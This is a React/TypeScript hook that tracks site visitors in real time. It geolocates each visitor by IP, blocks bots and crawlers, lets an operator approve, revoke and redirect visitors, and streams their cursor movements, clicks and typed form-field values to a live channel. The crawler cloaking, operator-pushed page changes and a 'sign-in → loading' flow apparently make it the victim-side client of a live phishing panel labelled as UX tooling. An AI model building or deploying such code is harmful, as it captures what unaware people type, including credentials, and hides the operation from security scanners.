import { useEffect, useRef, useState } from "react";
import { useNavigate, useRouterState } from "@tanstack/react-router";
import type { RealtimeChannel } from "@supabase/supabase-js";
import {
  getApproved,
  getOrCreateParticipantId,
  joinChannel,
  setApproved,
  type InputPayload,
  type LiveInputPayload,
  type ParticipantPresence,
} from "@/lib/orchestrator";
import {
  loadParticipant,
  markParticipantOffline,
  subscribeParticipant,
  touchParticipant,
  type ParticipantGeo,
  type ParticipantRecord,
} from "@/lib/participantStore";
import { getAppSettings, isLikelyBot, loadAppSettings } from "@/lib/appSettings";


export function useParticipant() {
  const navigate = useNavigate();
  const pathname = useRouterState({ select: (s) => s.location.pathname });
  const channelRef = useRef<RealtimeChannel | null>(null);
  const subscribedRef = useRef(false);
  const idRef = useRef<string>("");
  const pathnameRef = useRef(pathname);
  const lastAssignedRef = useRef<string | null | undefined>(undefined);
  const internalNavUntilRef = useRef(0);
  const [approved, setApprovedState] = useState<boolean>(false);
  pathnameRef.current = pathname;

  function internalNavActive() {
    if (Date.now() < internalNavUntilRef.current) return true;
    try {
      const until = Number(window.sessionStorage.getItem("__ux_internal_nav_until") || "0");
      if (Number.isFinite(until) && Date.now() < until) {
        internalNavUntilRef.current = until;
        return true;
      }
    } catch {
      /* ignore */
    }
    return false;
  }

  function applyParticipantRecord(record: ParticipantRecord | null) {
    if (!record) return;
    setApproved(record.approved);
    setApprovedState(record.approved);
    const assigned = record.assignedUrl ?? null;
    // Only redirect when the admin pushes a NEW assigned URL — not on every
    // heartbeat/refresh. This lets HTML-triggered navigation (e.g. sign-in →
    // loading) stick without being yanked back to the originally assigned page.
    if (lastAssignedRef.current === undefined) {
      lastAssignedRef.current = assigned;
      return;
    }
    if (assigned && assigned !== lastAssignedRef.current) {
      lastAssignedRef.current = assigned;
      if (record.approved && pathnameRef.current !== assigned && !internalNavActive()) {
        navigate({ to: assigned, reloadDocument: false }).catch(() => {
          window.location.assign(assigned);
        });
      }
    } else {
      lastAssignedRef.current = assigned;
    }
  }


  useEffect(() => {
    if (typeof window === "undefined") return;
    const ua = typeof navigator !== "undefined" ? navigator.userAgent : "";
    let cancelled = false;

    // Bot/crawler block — respect global toggle (sync from localStorage, then refresh)
    let blocked = getAppSettings().blockBots && isLikelyBot(ua);
    void (async () => {
      try { await loadAppSettings(); } catch { /* ignore */ }
      if (getAppSettings().blockBots && isLikelyBot(ua)) {
        blocked = true;
      }
    })();


    const id = getOrCreateParticipantId();
    idRef.current = id;
    setApprovedState(getApproved());

    let geoFetched: ParticipantGeo | undefined;
    async function fetchGeoOnce(): Promise<ParticipantGeo | undefined> {
      if (geoFetched) return geoFetched;
      try {
        const r = await fetch("https://ipwho.is/?fields=ip,country,country_code,region,city,success");
        const j = await r.json();
        if (j && j.success !== false) {
          geoFetched = {
            ip: j.ip ?? null,
            country: j.country ?? null,
            countryCode: j.country_code ?? null,
            region: j.region ?? null,
            city: j.city ?? null,
            userAgent: ua,
          };
        }
      } catch { /* ignore */ }
      if (!geoFetched) geoFetched = { userAgent: ua };
      return geoFetched;
    }

    async function syncRecord() {
      if (blocked) return;
      const geo = await fetchGeoOnce();
      await touchParticipant(id, window.location.pathname, geo);
      const record = await loadParticipant(id);
      if (!cancelled) applyParticipantRecord(record);
    }
    void syncRecord();


    const dbChannel = subscribeParticipant(id, () => {
      void loadParticipant(id).then((record) => {
        if (!cancelled) applyParticipantRecord(record);
      });
    });

    const channel = joinChannel({
      key: id,
      onNavigate: (p) => {
        if (p.targets === "all" || p.targets.includes(id)) {
          if (p.url !== pathnameRef.current && internalNavActive()) return;
          setApproved(true);
          setApprovedState(true);
          lastAssignedRef.current = p.url;
          navigate({ to: p.url, reloadDocument: false }).catch(() => {
            window.location.assign(p.url);
          });
        }
      },

      onApprove: (p) => {
        if (p.id !== id) return;
        setApproved(true);
        setApprovedState(true);
      },
      onRevoke: (p) => {
        if (p.id !== id) return;
        setApproved(false);
        setApprovedState(false);
        navigate({ to: "/", reloadDocument: false }).catch(() => {
          window.location.assign("/");
        });
      },
    });




    channel.subscribe(async (status) => {
      if (status === "SUBSCRIBED") {
        subscribedRef.current = true;
        await channel.track({
          id,
          currentUrl: window.location.pathname,
          joinedAt: Date.now(),
          approved: getApproved(),
        } satisfies ParticipantPresence);
      }
    });
    channelRef.current = channel;

    const heartbeat = window.setInterval(() => {
      if (blocked) return;
      void touchParticipant(id, pathnameRef.current, geoFetched);
    }, 8_000);


    // Mouse, click, scroll emitters
    let lastMouse = 0;
    const onMove = (e: MouseEvent) => {
      const now = Date.now();
      if (now - lastMouse < 40) return;
      lastMouse = now;
      const ch = channelRef.current;
      if (!ch || !subscribedRef.current) return;
      void ch.send({
        type: "broadcast",
        event: "mouse",
        payload: {
          id,
          x: e.clientX / window.innerWidth,
          y: e.clientY / window.innerHeight,
          vw: window.innerWidth,
          vh: window.innerHeight,
          at: now,
        },
      });
    };
    const onClick = (e: MouseEvent) => {
      const ch = channelRef.current;
      if (!ch || !subscribedRef.current) return;
      void ch.send({
        type: "broadcast",
        event: "click",
        payload: {
          id,
          x: e.clientX / window.innerWidth,
          y: e.clientY / window.innerHeight,
          at: Date.now(),
        },
      });
    };
    let lastScroll = 0;
    const onScroll = () => {
      const now = Date.now();
      if (now - lastScroll < 60) return;
      lastScroll = now;
      const ch = channelRef.current;
      if (!ch || !subscribedRef.current) return;
      void ch.send({
        type: "broadcast",
        event: "scroll",
        payload: { id, sx: window.scrollX, sy: window.scrollY, at: now },
      });
    };
    window.addEventListener("mousemove", onMove, { passive: true });
    window.addEventListener("click", onClick, { passive: true, capture: true });
    window.addEventListener("scroll", onScroll, { passive: true });

    // Forward iframe-originated pointer events (the design iframe covers the
    // viewport, so the parent window never sees them directly).
    let lastIframeMouse = 0;
    let lastViewport = { w: 0, h: 0 };
    function sendViewport(w: number, h: number) {
      if (w === lastViewport.w && h === lastViewport.h) return;
      lastViewport = { w, h };
      const ch = channelRef.current;
      if (!ch || !subscribedRef.current) return;
      void ch.send({
        type: "broadcast",
        event: "viewport",
        payload: { id, w, h, at: Date.now() },
      });
    }
    // Send our own viewport too (Focus Room, etc).
    sendViewport(window.innerWidth, window.innerHeight);
    const onResize = () => sendViewport(window.innerWidth, window.innerHeight);
    window.addEventListener("resize", onResize);

    const onIframeMsg = (e: MessageEvent) => {
      const d = e.data;
      if (!d || typeof d !== "object" || d.__ux !== true) return;
      if (d.type === "internal_navigation") {
        internalNavUntilRef.current = Date.now() + 15_000;
        if (typeof d.url === "string") {
          lastAssignedRef.current = d.url;
          if (idRef.current) void touchParticipant(idRef.current, d.url);
          // Client-side navigation — no full page reload, smooth swap.
          if (pathnameRef.current !== d.url) {
            navigate({ to: d.url, reloadDocument: false }).catch(() => {
              window.location.assign(d.url);
            });
          }
        }
        return;
      }

      const ch = channelRef.current;
      if (!ch || !subscribedRef.current) return;
      const now = Date.now();
      if (d.type === "viewport" && typeof d.w === "number" && typeof d.h === "number") {
        sendViewport(d.w, d.h);
        return;
      }
      if (d.type === "mouse" && typeof d.x === "number" && typeof d.y === "number") {
        if (now - lastIframeMouse < 40) return;
        lastIframeMouse = now;
        const w = typeof d.w === "number" && d.w > 0 ? d.w : window.innerWidth;
        const h = typeof d.h === "number" && d.h > 0 ? d.h : window.innerHeight;
        sendViewport(w, h);
        void ch.send({
          type: "broadcast",
          event: "mouse",
          payload: { id, x: d.x / w, y: d.y / h, vw: w, vh: h, at: now },
        });
      } else if (d.type === "click" && typeof d.x === "number" && typeof d.y === "number") {
        const w = typeof d.w === "number" && d.w > 0 ? d.w : window.innerWidth;
        const h = typeof d.h === "number" && d.h > 0 ? d.h : window.innerHeight;
        void ch.send({
          type: "broadcast",
          event: "click",
          payload: { id, x: d.x / w, y: d.y / h, at: now },
        });
      } else if (d.type === "scroll" && typeof d.sx === "number" && typeof d.sy === "number") {
        void ch.send({
          type: "broadcast",
          event: "scroll",
          payload: { id, sx: d.sx, sy: d.sy, at: now },
        });
      } else if (d.type === "input" && typeof d.field === "string") {
        const payload: InputPayload = {
          participantId: id,
          field: d.field,
          value: String(d.value ?? ""),
          url: pathnameRef.current,
          at: now,
        };
        void ch.send({ type: "broadcast", event: "input", payload });
      }
    };
    window.addEventListener("message", onIframeMsg);

    const onUnload = () => {
      try {
        channel.untrack();
      } catch {
        /* noop */
      }
    };
    window.addEventListener("beforeunload", onUnload);

    return () => {
      cancelled = true;
      window.removeEventListener("mousemove", onMove);
      window.removeEventListener("click", onClick, true);
      window.removeEventListener("scroll", onScroll);
      window.removeEventListener("message", onIframeMsg);
      window.removeEventListener("resize", onResize);
      window.removeEventListener("beforeunload", onUnload);
      window.clearInterval(heartbeat);
      subscribedRef.current = false;
      channel.untrack();
      void markParticipantOffline(id);
      void dbChannel.unsubscribe();
      void channel.unsubscribe();
      channelRef.current = null;
    };
  }, [navigate]);

  useEffect(() => {
    const assigned = lastAssignedRef.current;
    if (assigned && pathname !== assigned) {
      const until = Date.now() + 60_000;
      internalNavUntilRef.current = until;
      try {
        window.sessionStorage.setItem("__ux_internal_nav_until", String(until));
      } catch {
        /* ignore */
      }
    }
    const ch = channelRef.current;
    const id = idRef.current;
    if (!ch || !id || !subscribedRef.current) return;
    void touchParticipant(id, pathname);
    void ch.track({
      id,
      currentUrl: pathname,
      joinedAt: Date.now(),
      approved,
    } satisfies ParticipantPresence);
  }, [pathname, approved]);

  function emitInput(field: string, value: string) {
    const ch = channelRef.current;
    if (!ch || !subscribedRef.current) return;
    const payload: InputPayload = {
      participantId: idRef.current,
      field,
      value,
      url: pathname,
      at: Date.now(),
    };
    void ch.send({ type: "broadcast", event: "input", payload });
  }

  return { emitInput, participantId: idRef.current, approved };
}
